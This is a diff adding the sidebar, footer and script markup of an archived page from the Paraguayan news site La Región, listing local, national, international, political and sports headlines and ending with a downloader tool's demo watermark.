+				<p class="post-item-category"><a href="categorias/locales/" rel="category tag">Locales</a></p>				<p class="post-item-title"><a href="el-gobernador-marcelo-soto-celebro-el-dia-del-nino-en-caaguazu-y-cnel-oviedo/" rel="bookmark">El Gobernador Marcelo Soto celebró el Día del Niño en Caaguazú y Cnel. Oviedo</a></p>
+				<p class="post-item-date">19 agosto 2023</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="recluso-obtiene-su-libertad-y-horas-despues-muere-arrollado/">
+					<img width="520" height="245" src="https://laregion.com.py/wp-content/uploads/2022/12/Recluso-obtiene-su-libertad-y-horas-despues-muere-arrolladoJPG-520x245.webp" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/locales/" rel="category tag">Locales</a></p>				<p class="post-item-title"><a href="recluso-obtiene-su-libertad-y-horas-despues-muere-arrollado/" rel="bookmark">Recluso obtiene su libertad y horas después muere arrollado</a></p>
+				<p class="post-item-date">28 diciembre 2022</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="derrumban-con-maquinas-una-escuela-en-una-colonia-menonita-de-caaguazu/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2022/12/escuela-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/locales/" rel="category tag">Locales</a></p>				<p class="post-item-title"><a href="derrumban-con-maquinas-una-escuela-en-una-colonia-menonita-de-caaguazu/" rel="bookmark">Derrumban con máquinas una escuela en una colonia menonita de Caaguazú</a></p>
+				<p class="post-item-date">28 diciembre 2022</p>			</div>
+		</li>
+				    	</ul><!--/.alx-posts-->
+</div>
+<div id="alxposts-3" class="widget widget_hu_posts">
+<h3 class="widget-title">Regionales</h3>
+	<ul class="alx-posts group thumbs-enabled">
+    				<li>
+						<div class="post-item-thumbnail">
+				<a href="meteorologia-anuncia-lluvias-con-tormentas-electricas-moderadas-a-fuertes/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/08/Nublado-Lluvia-ok-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>				<p class="post-item-title"><a href="meteorologia-anuncia-lluvias-con-tormentas-electricas-moderadas-a-fuertes/" rel="bookmark">Meteorología anuncia lluvias con tormentas eléctricas moderadas a fuertes</a></p>
+				<p class="post-item-date">22 agosto 2024</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="mujer-acaba-con-la-vida-de-una-joven-de-19-anos-en-misiones/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/07/yanice-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>				<p class="post-item-title"><a href="mujer-acaba-con-la-vida-de-una-joven-de-19-anos-en-misiones/" rel="bookmark">Mujer acaba con la vida de una joven de 19 años en Misiones</a></p>
+				<p class="post-item-date">8 julio 2024</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="paraguay-busca-avanzar-en-produccion-y-mayor-calidad-en-el-rubro-banana/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/07/004-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>				<p class="post-item-title"><a href="paraguay-busca-avanzar-en-produccion-y-mayor-calidad-en-el-rubro-banana/" rel="bookmark">Paraguay busca avanzar en producción y mayor calidad en el rubro banana</a></p>
+				<p class="post-item-date">8 julio 2024</p>			</div>
+		</li>
+				    	</ul><!--/.alx-posts-->
+</div>
+<div id="alxposts-4" class="widget widget_hu_posts">
+<h3 class="widget-title">Nacionales</h3>
+	<ul class="alx-posts group thumbs-enabled">
+    				<li>
+						<div class="post-item-thumbnail">
+				<a href="cesar-sosa-asume-la-presidencia-del-consejo-de-gobernadores-con-el-apoyo-del-presidente-pena/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/08/cesar-sosa-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/nacionales/" rel="category tag">Nacionales</a></p>				<p class="post-item-title"><a href="cesar-sosa-asume-la-presidencia-del-consejo-de-gobernadores-con-el-apoyo-del-presidente-pena/" rel="bookmark">César Sosa Asume la Presidencia del Consejo de Gobernadores con el Apoyo del Presidente Peña</a></p>
+				<p class="post-item-date">21 agosto 2024</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="felipe-gonzalez-sera-el-ministro-de-salud-del-nuevo-gobierno/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/06/Ministro-de-Salud1-760x420-1-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/nacionales/" rel="category tag">Nacionales</a></p>				<p class="post-item-title"><a href="felipe-gonzalez-sera-el-ministro-de-salud-del-nuevo-gobierno/" rel="bookmark">Felipe González será el ministro de Salud del nuevo Gobierno</a></p>
+				<p class="post-item-date">27 junio 2023</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="cae-guardiacarcel-que-habria-intentado-meter-droga-al-penal-de-concepcion/">
+					<img width="520" height="245" src="https://laregion.com.py/wp-content/uploads/2023/01/Cae-guardiacarcel-que-habria-intentado-meter-droga-al-Penal-de-Concepcion-520x245.webp" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/nacionales/" rel="category tag">Nacionales</a></p>				<p class="post-item-title"><a href="cae-guardiacarcel-que-habria-intentado-meter-droga-al-penal-de-concepcion/" rel="bookmark">Cae guardiacárcel que habría intentado meter droga al Penal de Concepción</a></p>
+				<p class="post-item-date">20 enero 2023</p>			</div>
+		</li>
+				    	</ul><!--/.alx-posts-->
+</div>
+		</div><!--/.sidebar-content-->
+	</div><!--/.sidebar-->
+	<div class="sidebar s2 collapsed" data-position="right" data-layout="col-3cm" data-sb-id="s2">
+	<button class="sidebar-toggle" title="Amplia la barra lateral"><i class="fas sidebar-toggle-arrows"></i></button>
+	<div class="sidebar-content">
+		  		<div class="sidebar-top group">
+        <p>Más</p>  		</div>
+		<div id="custom_html-3" class="widget_text widget widget_custom_html"><h3 class="widget-title">TV</h3><div class="textwidget custom-html-widget">	<div class="svpPlayer" data-props="{&quot;data&quot;:{&quot;src&quot;:&quot;https:\/\/streaming.trece.com.py\/live\/trece.m3u8&quot;,&quot;poster&quot;:&quot;&quot;,&quot;captions&quot;:[]},&quot;options&quot;:{&quot;repeat&quot;:false,&quot;muted&quot;:false,&quot;autoplay&quot;:false,&quot;playsinline&quot;:true},&quot;styles&quot;:{&quot;width&quot;:&quot;100%&quot;}}"></div>
+	</div></div><div id="custom_html-4" class="widget_text widget widget_custom_html"><h3 class="widget-title">Publicidad</h3><div class="textwidget custom-html-widget"><div align="center"><img src="https://laregion.com.py/wp-content/uploads/2022/02/APP_300×250.gif" alt="" width="300" height="250"></div>
+</div></div><div id="tiempo_widget-2" class="widget tiempo_widget"><div class="tiempo-widget weather_widget_wrap" data-text-color="#000000" data-background="#ffffff" data-width="100" data-days="4" data-sunrise="on" data-wind="on" data-current="on" data-language="spanish" data-city="Coronel Oviedo" data-country="Paraguay">
+                <div class="weather_widget_placeholder"></div>
+                <div style="font-size: 14px;text-align: center;padding-top: 6px;padding-bottom: 4px;background: rgba(0,0,0,0.03);">
+                    Data from <a target="_blank" href="https://www.tiempo3.com/">Tiempo3.com</a>
+                </div>
+            </div></div><div id="alxposts-5" class="widget widget_hu_posts">
+<h3 class="widget-title">Internacionales</h3>
+	<ul class="alx-posts group thumbs-enabled">
+    				<li>
+						<div class="post-item-thumbnail">
+				<a href="desarrollan-una-vacuna-contra-el-cancer-de-rinon-con-un-100-de-eficacia/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2025/02/gkjsdgjgdsa-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/internacionales/" rel="category tag">Internacionales</a></p>				<p class="post-item-title"><a href="desarrollan-una-vacuna-contra-el-cancer-de-rinon-con-un-100-de-eficacia/" rel="bookmark">Desarrollan una vacuna contra el cáncer de riñón con un 100% de eficacia.</a></p>
+				<p class="post-item-date">7 febrero 2025</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="un-terremoto-de-magnitud-76-deja-al-menos-48-muertos-y-graves-danos-en-japon/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/01/hhfgajhf-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/internacionales/" rel="category tag">Internacionales</a></p>				<p class="post-item-title"><a href="un-terremoto-de-magnitud-76-deja-al-menos-48-muertos-y-graves-danos-en-japon/" rel="bookmark">Un terremoto de magnitud 7,6 deja al menos 48 muertos y graves daños en Japón</a></p>
+				<p class="post-item-date">2 enero 2024</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="republicanos-que-mas-suenan-para-2024-serian-malas-noticias-para-ucrania/">
+					<img width="229" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/03/lrcn1-229x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/internacionales/" rel="category tag">Internacionales</a></p>				<p class="post-item-title"><a href="republicanos-que-mas-suenan-para-2024-serian-malas-noticias-para-ucrania/" rel="bookmark">Republicanos que más suenan para 2024 serían malas noticias para Ucrania</a></p>
+				<p class="post-item-date">15 marzo 2023</p>			</div>
+		</li>
+				    	</ul><!--/.alx-posts-->
+</div>
+<div id="alxposts-6" class="widget widget_hu_posts">
+<h3 class="widget-title">Política</h3>
+	<ul class="alx-posts group thumbs-enabled">
+    				<li>
+						<div class="post-item-thumbnail">
+				<a href="presentaron-libelo-acusatorio-contra-diputado-por-uso-indebido-de-influencias/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2025/02/gsdhjgksfas-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/politica/" rel="category tag">Política</a></p>				<p class="post-item-title"><a href="presentaron-libelo-acusatorio-contra-diputado-por-uso-indebido-de-influencias/" rel="bookmark">Presentaron libelo acusatorio contra diputado por uso indebido de influencias</a></p>
+				<p class="post-item-date">7 febrero 2025</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="el-presidente-electo-santiago-pena-presento-nuevas-designaciones/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/07/gfhasgkdhfgahk-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/politica/" rel="category tag">Política</a></p>				<p class="post-item-title"><a href="el-presidente-electo-santiago-pena-presento-nuevas-designaciones/" rel="bookmark">El presidente electo Santiago Peña presentó nuevas designaciones</a></p>
+				<p class="post-item-date">31 julio 2023</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="el-ovetense-¨beto¨-ovelar-nuevo-presidente-del-senado/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/06/beto-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/politica/" rel="category tag">Política</a></p>				<p class="post-item-title"><a href="el-ovetense-¨beto¨-ovelar-nuevo-presidente-del-senado/" rel="bookmark">El Ovetense ¨Beto¨ Ovelar nuevo Presidente del senado</a></p>
+				<p class="post-item-date">30 junio 2023</p>			</div>
+		</li>
+				    	</ul><!--/.alx-posts-->
+</div>
+<div id="alxposts-7" class="widget widget_hu_posts">
+<h3 class="widget-title">Deportes</h3>
+	<ul class="alx-posts group thumbs-enabled">
+    				<li>
+						<div class="post-item-thumbnail">
+				<a href="messi-hizo-historia-en-estados-unidos-se-consagro-campeon-con-el-inter-miami/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/gakgfahfakejr-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/deportes/" rel="category tag">Deportes</a></p>				<p class="post-item-title"><a href="messi-hizo-historia-en-estados-unidos-se-consagro-campeon-con-el-inter-miami/" rel="bookmark">Messi hizo historia en Estados Unidos: se consagró campeón con el Inter Miami</a></p>
+				<p class="post-item-date">20 agosto 2023</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="espana-se-consagra-campeona-de-futbol-femenino/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/zgzdtgg-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/deportes/" rel="category tag">Deportes</a></p>				<p class="post-item-title"><a href="espana-se-consagra-campeona-de-futbol-femenino/" rel="bookmark">España se consagra campeona de Futbol femenino</a></p>
+				<p class="post-item-date">20 agosto 2023</p>			</div>
+		</li>
+				<li>
+						<div class="post-item-thumbnail">
+				<a href="salud-pueblo-olimpista-el-decano-pasa-a-cuartos-de-final/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/olim-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
+				<p class="post-item-category"><a href="categorias/deportes/" rel="category tag">Deportes</a></p>				<p class="post-item-title"><a href="salud-pueblo-olimpista-el-decano-pasa-a-cuartos-de-final/" rel="bookmark">Salud pueblo Olimpista!!! el decano pasa a cuartos de final</a></p>
+				<p class="post-item-date">11 agosto 2023</p>			</div>
+		</li>
+				    	</ul><!--/.alx-posts-->
+</div>
+	</div><!--/.sidebar-content-->
+</div><!--/.sidebar-->
+        </div><!--/.main-inner-->
+      </div><!--/.main-->
+    </div><!--/.container-inner-->
+  </div><!--/.container-->
+    <footer id="footer">
+          <nav class="nav-container group" id="nav-footer" data-menu-id="footer-4" data-menu-scrollable="false">
+                      <!-- <div class="ham__navbar-toggler collapsed" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="ham-toggler-menu__span"></span>
+          </div>
+        </div> -->
+        <button class="ham__navbar-toggler-two collapsed" title="Menu" aria-expanded="false">
+          <span class="ham__navbar-span-wrapper">
+            <span class="line line-1"></span>
+            <span class="line line-2"></span>
+            <span class="line line-3"></span>
+          </span>
+        </button>
+                    <div class="nav-text"></div>
+        <div class="nav-wrap">
+          <ul id="menu-paginas-1" class="nav container group"><li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-17"><a href="/" aria-current="page">Inicio</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19"><a href="somos/">Somos</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4989"><a href="revistas/">Revista</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18"><a href="contacto/">Contacto</a></li>
+</ul>        </div>
+      </nav><!--/#nav-footer-->
+    <section class="container" id="footer-bottom">
+      <div class="container-inner">
+        <a id="back-to-top" href="#"><i class="fas fa-angle-up"></i></a>
+        <div class="hu-pad group">
+          <div class="grid one-half">
+            <div id="copyright">
+                <p>La Región &copy; 2025. Todos los derechos reservados.</p>
+            </div><!--/#copyright-->
+          </div>
+          <div class="grid one-half last">
+                                          <ul class="social-links"><li><a rel="nofollow noopener noreferrer" class="social-tooltip" title="Síguenos en Facebook" aria-label="Síguenos en Facebook" href="https://www.facebook.com/laregionparaguay/" target="_blank"><i class="fab fa-facebook-square"></i></a></li><li><a rel="nofollow noopener noreferrer" class="social-tooltip" title="Síguenos en Twitter-square" aria-label="Síguenos en Twitter-square" href="https://twitter.com/laregionoticias" target="_blank"><i class="fab fa-twitter-square"></i></a></li></ul>                                    </div>
+        </div><!--/.hu-pad-->
+      </div><!--/.container-inner-->
+    </section><!--/.container-->
+  </footer><!--/#footer-->
+</div><!--/#wrapper-->
+<link rel="stylesheet" id="bplugins-frontend-css" href="https://laregion.com.py/wp-content/plugins/super-video-player/dist/frontend.css?ver=1.7.5" media="all"/>
+<script src="https://laregion.com.py/wp-content/plugins/super-video-player/admin/blocks/block-script.js?ver=1.7.5" id="block-script-js"></script>
+<script src="https://laregion.com.py/wp-includes/js/underscore.min.js?ver=1.13.7" id="underscore-js"></script>
+<script id="hu-init-js-js-extra">
+var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":false,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"1","extLinksTargetExt":"1","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"1","imgSmartLoadOpts":{"parentSelectors":[".container .content",".post-row",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100,"threshold":0}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":false,"mobile":false},"sidebarOneWidth":"340","sidebarTwoWidth":"260","isWPMobile":"","menuStickyUserSettings":{"desktop":"no_stick","mobile":"no_stick"},"mobileSubmenuExpandOnClick":"1","submenuTogglerIcon":"<i class=\"fas fa-angle-down\"><\/i>","isDevMode":"","ajaxUrl":"https:\/\/laregion.com.py\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"07609a1423"},"isWelcomeNoteOn":"","welcomeContent":"","i18n":{"collapsibleExpand":"Ampliar","collapsibleCollapse":"Contraer"},"deferFontAwesome":"1","fontAwesomeUrl":"https:\/\/laregion.com.py\/wp-content\/themes\/hueman\/assets\/front\/css\/font-awesome.min.css?3.7.27","mainScriptUrl":"https:\/\/laregion.com.py\/wp-content\/themes\/hueman\/assets\/front\/js\/scripts.min.js?3.7.27","flexSliderNeeded":"1","flexSliderOptions":{"is_rtl":false,"has_touch_support":true,"is_slideshow":true,"slideshow_speed":5000},"fitTextMap":{"single_post_title":{"selectors":".single h1.entry-title","minEm":1.375,"maxEm":2.62},"page_title":{"selectors":".page-title h1","minEm":1,"maxEm":1.3},"home_page_title":{"selectors":".home .page-title","minEm":1,"maxEm":1.2,"compression":2.5},"post_titles":{"selectors":".blog .post-title, .archive .post-title","minEm":1.375,"maxEm":1.475},"featured_post_titles":{"selectors":".featured .post-title","minEm":1.375,"maxEm":2.125},"comments":{"selectors":".commentlist li","minEm":0.8125,"maxEm":0.93,"compression":2.5},"entry":{"selectors":".entry","minEm":0.9375,"maxEm":1.125,"compression":2.5},"content_h1":{"selectors":".entry h1, .woocommerce div.product h1.product_title","minEm":1.7578125,"maxEm":2.671875},"content_h2":{"selectors":".entry h2","minEm":1.5234375,"maxEm":2.390625},"content_h3":{"selectors":".entry h3","minEm":1.40625,"maxEm":1.96875},"content_h4":{"selectors":".entry h4","minEm":1.2890625,"maxEm":1.6875},"content_h5":{"selectors":".entry h5","minEm":1.0546875,"maxEm":1.40625},"content_h6":{"selectors":".entry h6","minEm":0.9375,"maxEm":1.265625,"compression":2.5}},"userFontSize":"15","fitTextCompression":"1.5"};
+</script>
+<script src="https://laregion.com.py/wp-content/themes/hueman/assets/front/js/hu-init.min.js?ver=3.7.27" id="hu-init-js-js"></script>
+<script src="https://laregion.com.py/wp-includes/js/dist/vendor/react.min.js?ver=18.3.1.1" id="react-js"></script>
+<script src="https://laregion.com.py/wp-includes/js/dist/vendor/react-dom.min.js?ver=18.3.1.1" id="react-dom-js"></script>
+<script src="https://laregion.com.py/wp-content/plugins/super-video-player/dist/frontend.js?ver=1.7.5" id="bplugins-frontend-js"></script>
+<script src="https://laregion.com.py/wp-content/plugins/super-video-player/public/js/hls.js?ver=1.7.5" id="svp-hls-js-js"></script>
+<!--[if lt IE 9]>
+<script src="https://laregion.com.py/wp-content/themes/hueman/assets/front/js/ie/respond.js"></script>
+<![endif]-->
+<center><font size="2">This is a free demo result from the Wayback Machine Downloader. <a href="https://www.waybackmachinedownloads.com">Click here</a> to download the full version.</font></center></body>
+</html>
